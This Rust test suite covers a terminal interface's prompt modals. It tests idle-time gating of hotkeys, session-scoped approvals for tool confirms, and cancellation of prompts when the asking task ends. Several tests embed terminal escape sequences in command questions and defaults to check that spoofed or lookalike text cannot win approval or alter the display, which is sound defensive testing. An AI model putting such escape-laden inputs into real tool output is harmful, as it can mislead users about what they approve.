use super::*;
use crate::tui::modal::{CLIPPED_HINT, CUSTOM_CHOICE_ROW, confirm_hint};

/// Keys a confirm ignores are still typing: five of them at 200 ms
/// spacing after the modal appears keep the gate armed, so a `y` at
/// 1.2 s (past the modal's own second) is dropped, and the same `y`
/// answers once a full idle second has passed since the last key.
#[test]
fn typing_a_confirm_ignores_keeps_the_hotkey_gate_armed() {
    let mut harness = Harness::standalone(80, 24);
    harness.clock.advance(10 * HOTKEY_IDLE);
    let asker = ask_on_a_thread(&mut harness, confirm_request(None));
    for _ in 0..5 {
        harness.clock.advance(Duration::from_millis(200));
        assert_eq!(harness.press(KeyCode::Char('x')), None);
    }
    harness.clock.advance(Duration::from_millis(200));
    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(
        harness.app.prompts.len(),
        1,
        "a hotkey right after ignored typing answered the modal"
    );
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(true)
    );
}

#[test]
fn confirm_modal_hotkeys_answer_the_asking_thread() {
    for (key, expected) in [
        (KeyCode::Char('y'), PromptAnswer::Confirmed(true)),
        (KeyCode::Char('n'), PromptAnswer::Confirmed(false)),
        (KeyCode::Esc, PromptAnswer::Cancelled),
        (KeyCode::Enter, PromptAnswer::Confirmed(true)),
    ] {
        let mut harness = Harness::standalone(80, 24);
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        // The gate counts from the modal's appearance.
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(key), None);
        assert_eq!(asker.join().unwrap().unwrap(), expected, "{key:?}");
        assert!(harness.app.prompts.is_empty());
    }
}

/// Enter on a tool's confirm answers no unless the tool itself asked
/// for a default of yes.
#[test]
fn enter_on_a_tool_confirm_answers_no_unless_the_tool_defaults_to_yes() {
    for (default, expected) in [
        (None, PromptAnswer::Confirmed(false)),
        (
            Some(serde_json::json!(false)),
            PromptAnswer::Confirmed(false),
        ),
        (Some(serde_json::json!(true)), PromptAnswer::Confirmed(true)),
    ] {
        let mut harness = Harness::standalone(80, 24);
        let req = PromptRequest {
            default: default.clone(),
            ..confirm_request(Some("fs_write"))
        };
        let asker = ask_on_a_thread(&mut harness, req);
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(asker.join().unwrap().unwrap(), expected, "{default:?}");
    }
}

/// Keys typed ahead of a tool's confirm never answer it, Enter and the
/// yes hotkeys alike: neither one pressed before the question nor one
/// still arriving as it comes up. It waits for a key pressed after it
/// has been up for the idle second.
#[test]
fn keys_typed_before_a_tool_confirm_do_not_answer_it() {
    for key in [KeyCode::Enter, KeyCode::Char('y'), KeyCode::Char('a')] {
        let mut harness = Harness::standalone(80, 24);
        harness.clock.advance(10 * HOTKEY_IDLE);
        harness.press(KeyCode::Char('y'));
        let asker = ask_on_a_thread(&mut harness, confirm_request(Some("fs_write")));
        assert_eq!(harness.press(key), None);
        assert_eq!(harness.app.prompts.len(), 1, "{key:?} answered");
        harness.clock.advance(HOTKEY_IDLE);
        assert!(!asker.is_finished(), "{key:?}");
        assert_eq!(harness.press(KeyCode::Char('n')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(false),
            "{key:?}"
        );
    }
}

/// A user idle for longer than the gate who taps a hotkey just as the
/// modal comes up has not seen it: the gate counts from the modal's
/// appearance, so the tap is dropped and the same key answers once
/// the modal has been up for `HOTKEY_IDLE`. Esc stays exempt.
#[test]
fn a_hotkey_as_the_modal_appears_is_not_an_answer() {
    let mut harness = Harness::standalone(80, 24);
    harness.clock.advance(10 * HOTKEY_IDLE);
    let asker = ask_on_a_thread(&mut harness, confirm_request(None));
    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(
        harness.app.prompts.len(),
        1,
        "the undrawn modal was answered"
    );
    assert!(!asker.is_finished());
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(true)
    );

    let mut harness = Harness::standalone(80, 24);
    harness.clock.advance(10 * HOTKEY_IDLE);
    let asker = ask_on_a_thread(&mut harness, confirm_request(None));
    assert_eq!(harness.press(KeyCode::Esc), None);
    assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);
}

#[test]
fn a_hotkey_right_after_typing_is_not_an_answer() {
    let mut harness = Harness::standalone(80, 24);
    harness.type_text("draft");
    let asker = ask_on_a_thread(&mut harness, confirm_request(None));
    harness.clock.advance(Duration::from_millis(200));
    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(harness.app.prompts.len(), 1);
    assert!(!asker.is_finished());
    // The dropped `y` was a keystroke too: the idle second counts
    // from it, not from the draft.
    harness.clock.advance(Duration::from_millis(800));
    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(harness.app.prompts.len(), 1);
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(true)
    );
    assert_eq!(harness.app.composer_text(), "draft");
}

/// The gate holds for every modal kind and its answer key: the key
/// pressed before the question arrives is typing, the key one
/// millisecond short of the idle second is dropped (and re-arms a
/// hotkey's gate), and the key at the full second answers. A fresh
/// modal answered exactly at the second pins the boundary itself;
/// for the input field, characters typed inside that second do not
/// move it.
#[test]
fn checklist_8_typeahead_and_idle_gate_guard_the_modal() {
    type GateCase = (
        &'static str,
        fn() -> PromptRequest,
        &'static str,
        KeyCode,
        PromptAnswer,
    );
    let input_request = || PromptRequest::new(PromptAction::Input, "Name?", Origin::detached());
    let cases: [GateCase; 3] = [
        (
            "confirm",
            || confirm_request(None),
            "",
            KeyCode::Char('y'),
            PromptAnswer::Confirmed(true),
        ),
        (
            "input",
            input_request,
            "ab",
            KeyCode::Enter,
            PromptAnswer::Text("ab".to_string()),
        ),
        (
            "select",
            || list_request(PromptAction::Select, None),
            "",
            KeyCode::Char('1'),
            PromptAnswer::Selected("alpha".to_string()),
        ),
    ];
    for (kind, request, typed, key, expected) in cases {
        let mut harness = Harness::standalone(80, 24);
        harness.clock.advance(10 * HOTKEY_IDLE);
        assert_eq!(harness.press(key), None, "{kind}");
        let asker = ask_on_a_thread(&mut harness, request());
        harness.type_text(typed);
        assert_eq!(
            harness.app.prompts.len(),
            1,
            "{kind}: the early key answered"
        );
        assert!(!asker.is_finished(), "{kind}");
        harness
            .clock
            .advance(HOTKEY_IDLE - Duration::from_millis(1));
        assert_eq!(harness.press(key), None);
        assert_eq!(
            harness.app.prompts.len(),
            1,
            "{kind}: answered a millisecond early"
        );
        assert!(!asker.is_finished(), "{kind}");
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(key), None);
        assert_eq!(asker.join().unwrap().unwrap(), expected, "{kind}");

        let mut harness = Harness::standalone(80, 24);
        harness.clock.advance(10 * HOTKEY_IDLE);
        let asker = ask_on_a_thread(&mut harness, request());
        harness.type_text(typed);
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(key), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            expected,
            "{kind}: the full second did not answer"
        );
    }

    // A checkbox's Space is held to the same gate: typed ahead it
    // ticks nothing and re-arms, after the idle second it ticks.
    let mut harness = Harness::standalone(80, 24);
    harness.clock.advance(10 * HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char(' ')), None);
    let asker = ask_on_a_thread(&mut harness, list_request(PromptAction::Checkbox, None));
    assert_eq!(harness.press(KeyCode::Char(' ')), None);
    assert!(harness.draw().contains("[ ] alpha"));
    harness
        .clock
        .advance(HOTKEY_IDLE - Duration::from_millis(1));
    assert_eq!(harness.press(KeyCode::Char(' ')), None);
    assert!(harness.draw().contains("[ ] alpha"));
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char(' ')), None);
    assert!(harness.draw().contains("[x] alpha"));
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Checked(vec!["alpha".to_string()])
    );
}

/// Answering one question re-arms the idle gate for the next queued
/// one: a `y` held down or pressed twice answers only the first.
#[test]
fn a_hotkey_right_after_answering_does_not_answer_the_next_queued_prompt() {
    let mut harness = Harness::standalone(80, 24);
    let first = ask_on_a_thread(&mut harness, confirm_request(None));
    let second = ask_on_a_thread(&mut harness, confirm_request(Some("fs_write")));
    assert_eq!(harness.app.prompts.len(), 2);

    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(
        first.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(true)
    );
    assert_eq!(harness.app.prompts.len(), 1);

    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(harness.app.prompts.len(), 1);
    assert!(!second.is_finished());

    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(
        second.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(true)
    );
    assert!(harness.app.prompts.is_empty());
}

/// Enter that submits a line is a keystroke for the idle gate: a confirm
/// raised by the turn just submitted is not answered by a repeated Enter.
#[test]
fn enter_right_after_submitting_does_not_answer_a_fresh_confirm() {
    let mut harness = Harness::standalone(80, 24);
    harness.type_text("call the tool");
    harness.clock.advance(HOTKEY_IDLE);
    assert!(matches!(
        harness.press(KeyCode::Enter),
        Some(Command::Submit(..))
    ));
    let asker = ask_on_a_thread(&mut harness, confirm_request(None));
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(harness.app.prompts.len(), 1);
    assert!(!asker.is_finished());
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(true)
    );
}

/// A paste while a confirm is up has nowhere visible to go: the modal
/// has no field and the composer is hidden under it.
#[test]
fn a_paste_under_a_confirm_is_dropped() {
    let mut harness = Harness::standalone(80, 24);
    harness.type_text("draft");
    let asker = ask_on_a_thread(&mut harness, confirm_request(None));
    harness
        .app
        .handle_input(TermInput::Paste("pasted-p3x".to_string()));
    assert_eq!(harness.app.composer_text(), "draft");
    assert_eq!(harness.app.prompts.len(), 1);
    harness.clock.advance(HOTKEY_IDLE);
    harness.press(KeyCode::Esc);
    assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);
}

/// Enter tapped on an empty composer while the turn runs holds
/// nothing, but it is still a keystroke for the idle gate: a confirm
/// appearing right after one is not answered by the next tap of the
/// same key.
#[test]
fn enter_ignored_during_a_turn_still_arms_the_idle_gate_for_a_fresh_confirm() {
    let mut harness = Harness::standalone(80, 24);
    harness.type_text("call the tool");
    harness.clock.advance(HOTKEY_IDLE);
    assert!(matches!(
        harness.press(KeyCode::Enter),
        Some(Command::Submit(..))
    ));
    harness.app.begin_turn("call the tool", false);
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);

    harness.clock.advance(Duration::from_millis(200));
    let asker = ask_on_a_thread(&mut harness, confirm_request(None));
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(harness.app.prompts.len(), 1);
    assert!(!asker.is_finished());

    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(true)
    );
}

#[test]
fn yes_for_this_session_answers_and_is_remembered_for_the_tool() {
    let mut harness = Harness::standalone(80, 24);
    let req = confirm_request(Some("fs_write"));
    assert_eq!(harness.app.prompt_memory.auto_answer(&req), None);
    let asker = ask_on_a_thread(&mut harness, req.clone());
    assert!(harness.draw().contains("fs_write asks:"));
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char('a')), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(true)
    );
    assert_eq!(harness.app.prompt_memory.auto_answer(&req), Some(true));
}

/// A tool confirm as the prompt channel builds it from a protocol line.
fn tool_line_confirm(tool: &str, question: &str) -> PromptRequest {
    let line = serde_json::json!({"coyote_prompt": {
        "id": "p-ysr", "action": "confirm", "question": question
    }})
    .to_string();
    crate::function::prompt_channel::parse_request(
        line.as_bytes(),
        tool,
        None,
        None,
        Origin::detached(),
    )
    .unwrap()
    .req
}

/// "Yes for this session" is kept for the bytes the tool sent: a line
/// that only displays like the approved one, because its escape is
/// spelled out as text, is asked again.
#[test]
fn yes_for_this_session_is_remembered_for_the_raw_question() {
    let mut harness = Harness::standalone(80, 24);
    let req = tool_line_confirm(
        "execute_command",
        "Run this command?\necho hi\u{1b}]0;x\u{7}",
    );
    let asker = ask_on_a_thread(&mut harness, req.clone());
    let rendered = harness.draw();
    assert!(rendered.contains("echo hi\\x1b]0;x\\x07"), "{rendered}");
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char('a')), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(true)
    );

    let lookalike = tool_line_confirm(
        "execute_command",
        "Run this command?\necho hi\\x1b]0;x\\x07",
    );
    assert_eq!(lookalike.question, req.question);
    assert_eq!(harness.app.prompt_memory.auto_answer(&lookalike), None);
    let again = tool_line_confirm(
        "execute_command",
        "Run this command?\necho hi\u{1b}]0;x\u{7}",
    );
    assert_eq!(harness.app.prompt_memory.auto_answer(&again), Some(true));
}

/// Enter on the field settles from the modal's appearance: the
/// answer is typed, so typing must not push the send out. Enter a
/// millisecond short of the second is dropped, more typing right
/// after does not re-arm it, and Enter at the second sends.
#[test]
fn an_input_modal_types_into_its_own_field_and_sends_it() {
    let mut harness = Harness::standalone(80, 24);
    harness.type_text("draft");
    let req = PromptRequest::new(PromptAction::Input, "Session name:", Origin::detached());
    let asker = ask_on_a_thread(&mut harness, req);
    harness.type_text("notes");
    let frame = harness.draw();
    assert_welcome_snapshot("input_modal_80x24", &frame);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert!(!asker.is_finished());
    harness
        .clock
        .advance(HOTKEY_IDLE - Duration::from_millis(1));
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert!(!asker.is_finished());
    harness.type_text(" two");
    harness.clock.advance(Duration::from_millis(1));
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Text("notes two".to_string())
    );
    assert_eq!(harness.app.composer_text(), "draft");
}

/// A select lists its options under the question with the custom row
/// last; the arrows move the marker without the gate and Enter, once
/// idle, sends the marked option's text.
#[test]
fn a_select_modal_moves_its_marker_and_sends_the_row() {
    let mut harness = Harness::standalone(80, 24);
    let asker = ask_on_a_thread(
        &mut harness,
        list_request(PromptAction::Select, Some("ask")),
    );
    assert_eq!(harness.press(KeyCode::Down), None);
    let frame = harness.draw();
    assert_welcome_snapshot("select_modal_80x24", &frame);
    assert!(frame.contains("ask asks:"), "{frame}");
    let row = |needle: &str| frame.lines().position(|line| line.contains(needle));
    assert_eq!(
        row("ask asks:").map(|origin| origin + 1),
        row("Pick one q9d-s"),
        "{frame}"
    );
    assert!(frame.contains(CUSTOM_CHOICE_ROW), "{frame}");
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert!(!asker.is_finished());
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Selected("beta".to_string())
    );
    assert!(harness.app.prompts.is_empty());
}

/// A digit chooses the select's row outright; one past the options
/// does nothing, so a stray key cannot answer with the custom row.
#[test]
fn a_select_digit_chooses_the_row_outright() {
    let mut harness = Harness::standalone(80, 24);
    let asker = ask_on_a_thread(&mut harness, list_request(PromptAction::Select, None));
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char('4')), None);
    assert!(!asker.is_finished());
    assert_eq!(harness.press(KeyCode::Char('3')), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Selected("gamma".to_string())
    );
}

/// Enter on the custom row swaps the list for a text field, and the
/// field opens with a fresh gate: the Enter that typed the text
/// cannot send it until the gap passes. What is sent is a selection,
/// so the asker reads it like any other row.
#[test]
fn the_custom_row_of_a_select_opens_a_field_whose_text_is_the_selection() {
    let mut harness = Harness::standalone(80, 24);
    let asker = ask_on_a_thread(&mut harness, list_request(PromptAction::Select, None));
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char('k')), None);
    for _ in 0..5 {
        assert_eq!(harness.press(KeyCode::Down), None);
    }
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        harness.app.key_context().modal,
        Some(ModalKind::Select {
            custom_field_open: true
        })
    );
    harness.type_text("delta");
    let frame = harness.draw();
    assert_welcome_snapshot("select_custom_field_80x24", &frame);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert!(!asker.is_finished());
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Selected("delta".to_string())
    );
}

/// A checkbox ticks rows with Space and Enter sends the ticked
/// options in the list's order.
#[test]
fn a_checkbox_modal_ticks_rows_and_sends_them_in_order() {
    let mut harness = Harness::standalone(80, 24);
    let asker = ask_on_a_thread(&mut harness, list_request(PromptAction::Checkbox, None));
    assert_eq!(harness.press(KeyCode::Down), None);
    assert_eq!(harness.press(KeyCode::Down), None);
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char(' ')), None);
    assert_eq!(harness.press(KeyCode::Up), None);
    assert_eq!(harness.press(KeyCode::Up), None);
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char(' ')), None);
    let frame = harness.draw();
    assert_welcome_snapshot("checkbox_modal_80x24", &frame);
    assert!(frame.contains("[x] alpha"), "{frame}");
    assert!(frame.contains("[ ] beta"), "{frame}");
    assert!(!frame.contains(CUSTOM_CHOICE_ROW), "{frame}");
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Checked(["alpha", "gamma"].map(str::to_string).to_vec())
    );
}

/// A password's field shows a mask per character and sends the text
/// behind it.
#[test]
fn a_password_modal_masks_its_field() {
    let mut harness = Harness::standalone(80, 24);
    let req = PromptRequest::new(PromptAction::Password, "Token:", Origin::detached());
    let asker = ask_on_a_thread(&mut harness, req);
    harness.type_text("hunter2");
    let frame = harness.draw();
    assert_welcome_snapshot("password_modal_80x24", &frame);
    assert!(!frame.contains("hunter2"), "{frame}");
    assert!(frame.contains("*******"), "{frame}");
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Text("hunter2".to_string())
    );
}

/// A confirm's and a password's help ride along into the modal under
/// the question, the way an input's does.
#[test]
fn confirm_and_password_modals_draw_their_help_under_the_question() {
    let mut harness = Harness::standalone(80, 24);
    let req = PromptRequest {
        help: Some("Reinstalling overwrites every bundled macro.".to_string()),
        ..PromptRequest::new(PromptAction::Confirm, "Continue?", Origin::detached())
    };
    let asker = ask_on_a_thread(&mut harness, req);
    let frame = harness.draw();
    assert!(frame.contains("Continue?"), "{frame}");
    assert!(
        frame.contains("Reinstalling overwrites every bundled macro."),
        "{frame}"
    );
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Esc), None);
    assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);

    let req = PromptRequest {
        help: Some("Stored encrypted in the vault.".to_string()),
        ..PromptRequest::new(PromptAction::Password, "Token:", Origin::detached())
    };
    let asker = ask_on_a_thread(&mut harness, req);
    let frame = harness.draw();
    assert!(frame.contains("Token:"), "{frame}");
    assert!(frame.contains("Stored encrypted in the vault."), "{frame}");
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Esc), None);
    assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);
}

/// A help text broken over lines, with a blank line in it and a
/// trailing newline, is one dimmed paragraph under the question: no
/// row of the modal is left empty, and whitespace-only help adds none.
#[test]
fn a_modal_paints_no_empty_help_row() {
    let (reply, _answers) = mpsc::channel();
    let with_help = |help: &str| {
        PendingPrompt::new(
            PromptRequest {
                help: Some(help.to_string()),
                ..PromptRequest::new(PromptAction::Confirm, "Continue?", Origin::detached())
            },
            reply.clone(),
        )
    };
    let lines = with_help("Overwrites the macros.\n\nKeeps the roles.\n").question_lines(80);
    let texts: Vec<String> = lines.iter().map(Line::to_string).collect();
    assert_eq!(
        texts,
        ["Continue?", "Overwrites the macros. Keeps the roles."]
    );
    assert!(
        texts.iter().all(|text| !text.trim().is_empty()),
        "{texts:?}"
    );

    let lines = with_help("\n  \n").question_lines(80);
    let texts: Vec<String> = lines.iter().map(Line::to_string).collect();
    assert_eq!(texts, ["Continue?"]);
}

/// An input's default sits dimmed in the empty field as a placeholder,
/// so Enter alone accepts it and typing replaces it; its help line
/// sits dimmed between the question and the field.
#[test]
fn an_input_modal_shows_its_default_as_a_placeholder_and_typing_replaces_it() {
    let mut harness = Harness::standalone(80, 24);
    let req = PromptRequest {
        default: Some(serde_json::json!("us-east-1")),
        help: Some("Where your secrets live\n(e.g. us-east-1, eu-west-2)".to_string()),
        ..PromptRequest::new(PromptAction::Input, "AWS region:", Origin::detached())
    };
    let asker = ask_on_a_thread(&mut harness, req);
    let frame = harness.draw();
    assert_welcome_snapshot("prompt_modal_input_with_default_and_help", &frame);
    assert!(
        frame.contains("Where your secrets live (e.g. us-east-1, eu-west-2)"),
        "{frame}"
    );
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Text("us-east-1".to_string())
    );

    let req = PromptRequest {
        default: Some(serde_json::json!("x")),
        ..PromptRequest::new(PromptAction::Input, "Letter:", Origin::detached())
    };
    let asker = ask_on_a_thread(&mut harness, req);
    harness.type_text("yz");
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Text("yz".to_string())
    );
}

/// A default that is not a string (a number, say) is still offered:
/// rendered as text in the field and sent back on a bare Enter.
#[test]
fn an_input_modal_offers_a_numeric_default_as_text() {
    let mut harness = Harness::standalone(80, 24);
    let req = PromptRequest {
        default: Some(serde_json::json!(1000)),
        ..PromptRequest::new(PromptAction::Input, "Chunk size:", Origin::detached())
    };
    let asker = ask_on_a_thread(&mut harness, req);
    let frame = harness.draw();
    assert!(frame.contains("1000"), "{frame}");
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Text("1000".to_string())
    );
}

/// A default carrying a terminal escape is drawn without it, yet a
/// bare Enter still sends the default exactly as the tool gave it.
#[test]
fn an_input_modal_draws_its_default_without_escapes() {
    let mut harness = Harness::standalone(80, 24);
    let raw = "\x1b]0;title\x07keep-me";
    let req = PromptRequest {
        default: Some(serde_json::json!(raw)),
        ..PromptRequest::new(PromptAction::Input, "Name:", Origin::detached())
    };
    let asker = ask_on_a_thread(&mut harness, req);
    let frame = harness.draw();
    assert!(frame.contains("keep-me"), "{frame}");
    assert!(!frame.contains('\x1b'), "{frame:?}");
    assert!(!frame.contains("title"), "{frame:?}");
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Text(raw.to_string())
    );
}

/// A closed select lists only its options: the marker stops at the
/// last one and Enter there sends it rather than opening a field.
#[test]
fn a_closed_select_modal_has_no_custom_row() {
    let mut harness = Harness::standalone(80, 24);
    let req = PromptRequest {
        closed: true,
        ..list_request(PromptAction::Select, None)
    };
    let asker = ask_on_a_thread(&mut harness, req);
    for _ in 0..5 {
        assert_eq!(harness.press(KeyCode::Down), None);
    }
    let frame = harness.draw();
    assert_welcome_snapshot("prompt_modal_closed_select_no_custom_row", &frame);
    assert!(!frame.contains(CUSTOM_CHOICE_ROW), "{frame}");
    assert_eq!(harness.app.prompts.front().unwrap().list_len(), 3);
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Selected("gamma".to_string())
    );
    assert!(harness.app.prompts.is_empty());
}

/// A closed select with nothing to offer cannot be answered: Enter
/// cancels it instead of opening a custom field.
#[test]
fn an_empty_closed_select_modal_is_cancelled_on_enter() {
    let mut harness = Harness::standalone(80, 24);
    let req = PromptRequest {
        closed: true,
        options: Vec::new(),
        ..list_request(PromptAction::Select, None)
    };
    let asker = ask_on_a_thread(&mut harness, req);
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);
    assert!(harness.app.prompts.is_empty());
}

/// A list taller than the rows it gets scrolls to keep the marker in
/// view; the question keeps at least its one row.
#[test]
fn a_long_select_windows_its_rows_around_the_marker() {
    let mut harness = Harness::standalone(60, 14);
    let req = PromptRequest {
        options: (1..=20).map(|n| format!("option {n:02}")).collect(),
        ..PromptRequest::new(PromptAction::Select, "Pick one q9d-s", Origin::detached())
    };
    let _asker = ask_on_a_thread(&mut harness, req);
    let top = harness.draw();
    assert!(top.contains("> option 01"), "{top}");
    assert!(!top.contains("option 20"), "{top}");
    for _ in 0..19 {
        assert_eq!(harness.press(KeyCode::Down), None);
    }
    let bottom = harness.draw();
    assert!(bottom.contains("> option 20"), "{bottom}");
    assert!(!bottom.contains("option 01"), "{bottom}");
    assert!(bottom.contains("Pick one q9d-s"), "{bottom}");
}

/// A question whose asker ends is taken down with a cancel: the tool
/// call, job or agent that asked is matched by its id, an empty id
/// matches nothing, a queued question goes the same way as the front,
/// and the front's successor gets a fresh gate.
#[test]
fn a_prompt_is_cancelled_when_its_asker_ends() {
    fn asked_by(call_id: Option<&str>, job_id: Option<&str>) -> PromptRequest {
        PromptRequest {
            call_id: call_id.map(str::to_string),
            job_id: job_id.map(str::to_string),
            ..list_request(PromptAction::Select, None)
        }
    }
    fn asked_by_agent(agent_id: &str) -> PromptRequest {
        let mut req = asked_by(None, None);
        req.origin.agent_id = Some(agent_id.to_string());
        req
    }
    fn tool_finished(call_id: &str) -> UiMsg {
        UiMsg::ToolFinished {
            call_id: call_id.to_string(),
            ok: true,
            error: None,
            duration_ms: None,
        }
    }
    fn job_finished(job_id: &str) -> UiMsg {
        UiMsg::JobFinished {
            job_id: job_id.to_string(),
            ok: false,
            error: Some("boom".to_string()),
        }
    }
    fn job_cancelled(job_id: &str) -> UiMsg {
        UiMsg::JobCancelled {
            job_id: job_id.to_string(),
        }
    }
    fn agent_finished(agent_id: &str) -> UiMsg {
        UiMsg::AgentFinished {
            agent_id: agent_id.to_string(),
            outcome: AgentOutcome::Interrupted,
        }
    }
    let cases = [
        (
            asked_by(Some("call-1"), None),
            tool_finished("call-1"),
            true,
        ),
        (
            asked_by(Some("call-1"), None),
            tool_finished("call-2"),
            false,
        ),
        (
            asked_by(Some("call-1"), None),
            job_finished("call-1"),
            false,
        ),
        (asked_by(None, Some("job-1")), job_finished("job-1"), true),
        (asked_by(None, Some("job-1")), job_cancelled("job-1"), true),
        (asked_by(None, Some("job-1")), job_finished("job-2"), false),
        (asked_by(None, Some("job-1")), tool_finished("job-1"), false),
        (asked_by_agent("agent-1"), agent_finished("agent-1"), true),
        (asked_by_agent("agent-1"), agent_finished("agent-2"), false),
        (
            asked_by(None, Some("job-1")),
            agent_finished("job-1"),
            false,
        ),
        (asked_by(None, None), tool_finished(""), false),
        (asked_by(None, None), job_finished(""), false),
        (asked_by(None, None), agent_finished(""), false),
    ];
    for (req, msg, dismissed) in cases {
        let mut harness = Harness::standalone(80, 24);
        let label = format!(
            "{:?}/{:?}/{:?} on {msg:?}",
            req.call_id, req.job_id, req.origin.agent_id
        );
        let asker = ask_on_a_thread(&mut harness, req);
        harness.app.handle_msg(msg);
        assert_eq!(harness.app.prompts.is_empty(), dismissed, "{label}");
        if dismissed {
            assert_eq!(
                asker.join().unwrap().unwrap(),
                PromptAnswer::Cancelled,
                "{label}"
            );
        } else {
            assert!(!asker.is_finished(), "{label}");
            harness.app.abandon_prompts();
        }
    }

    let mut harness = Harness::standalone(80, 24);
    let front = ask_on_a_thread(&mut harness, asked_by(Some("call-1"), None));
    let queued = ask_on_a_thread(&mut harness, asked_by(None, Some("job-1")));
    let third = ask_on_a_thread(&mut harness, asked_by(None, Some("job-2")));
    harness.app.handle_msg(job_finished("job-2"));
    assert_eq!(harness.app.prompts.len(), 2);
    assert_eq!(third.join().unwrap().unwrap(), PromptAnswer::Cancelled);
    assert!(!front.is_finished());
    harness.clock.advance(HOTKEY_IDLE);
    harness.app.handle_msg(tool_finished("call-1"));
    assert_eq!(front.join().unwrap().unwrap(), PromptAnswer::Cancelled);
    assert_eq!(harness.app.prompts.len(), 1);
    assert_eq!(harness.press(KeyCode::Enter), None);
